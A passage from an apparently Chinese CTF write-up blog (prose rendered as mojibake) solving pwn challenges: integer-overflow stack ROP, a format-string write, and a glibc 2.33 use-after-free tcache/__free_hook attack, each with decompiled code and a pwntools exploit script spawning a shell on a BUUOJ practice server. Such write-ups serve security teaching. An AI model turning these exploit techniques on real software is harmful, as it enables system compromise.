class="built_in">puts</span>(<span class="string">&quot;\n\n----------------------------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choice:\n1.add num\n2.get sum\n3.get avg\n4.exit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;----------------------------------------------------\n&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your choice:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;avg = %d\n&quot;</span>, v6 / v4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no avg!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input num&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1[v4++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">        v6 += v1[i];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;sum = %d\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;exit!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€å§‹çš„ <code>scanf</code> å¤„æœªæ£€æŸ¥è¾“å…¥ï¼Œè¯»å…¥è´Ÿæ•°å¯è‡´è´Ÿæº¢å‡ºï¼Œå†ç»“åˆå†™å…¥æ•°æ®çš„ç¬¬äºŒä¸ª <code>scanf</code>ï¼Œ å¯ä»¥è¶Šæ ˆä¸€ç›´å†™ï¼Œæœ€ååˆ©ç”¨ROPä¿®æ”¹è¿”å›åœ°å€ï¼Œç¬¬ä¸€æ¬¡ROPæ±‚libcåŸºåœ°å€ï¼Œç¬¬äºŒæ¬¡ROPå¯getshellï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28547</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">n</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input num&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">hackme_addr = elf.sym.hackme</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(puts_plt)</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(puts_got)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;exit!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x67560</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x3cf10</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x17b9db</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(signed(system_addr))</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(signed(binsh_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What about your love to Dest0g3?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, format, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 == <span class="number">1314520</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I can feel your love!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your dont love Dest0g3 at all!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œéœ€è¦æ”¹å†™å€¼çš„ä¸²åœ¨bssæ®µé‡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29044</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;%12$p%10$p&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x1185</span></span><br><span class="line">stack = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0xd8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(stack % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">target = base + <span class="number">0x4010</span></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%39$hn&#x27;</span>.<span class="built_in">format</span>(target % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%1314520c%12$n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line"></span><br><span class="line">  sub_11C5(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = read_n();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please tell me the index: &quot;</span>);</span><br><span class="line">  v0 = read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_40C0 + v0) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)v0 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_40C0 + v0));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é«˜ç‰ˆæœ¬ï¼ˆ2.33ï¼‰çš„UAFæ¼æ´åˆ©ç”¨ï¼Œåœ¨tcacheé‡Œå†™å…¥__free_hookï¼Œå†å†™å…¥systemã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26427</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me its size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Please tell me its content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: \n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap_addr1 = ((u64(r.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x380</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr1))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_hook = libc_base + libc.sym.__free_hook</span><br><span class="line"><span class="comment">#print(hex(free_hook))</span></span><br><span class="line">heap_addr2 = (((u64(r.recv(<span class="number">8</span>)) ^ heap_addr1) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x330</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr2))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = ((heap_addr2 &gt;&gt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) ^ free_hook</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="built_in">next</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.sym.system</span><br><span class="line"><span class="comment">#print(hex(system_addr))</span></span><br><span class="line">add(<span class="number">0x40</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="emma"><a href="#emma" class="headerlink" title="emma"></a>emma</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read_n();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete(a1, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">      a1 = <span class="string">&quot;Invaild Choice!&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          show(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          edit(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1047</span> &amp;&amp; v1 &lt;= <span class="number">4096</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, v3);</span><br><span class="line">    qword_4060[v2] = buf;</span><br><span class="line">    dword_40E0[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  result = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="type">void</span> *)qword_4060[v2], (<span class="type">int</span>)dword_40E0[v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v0;</span><br><span class="line">  v1 = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)qword_4060[v3]);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 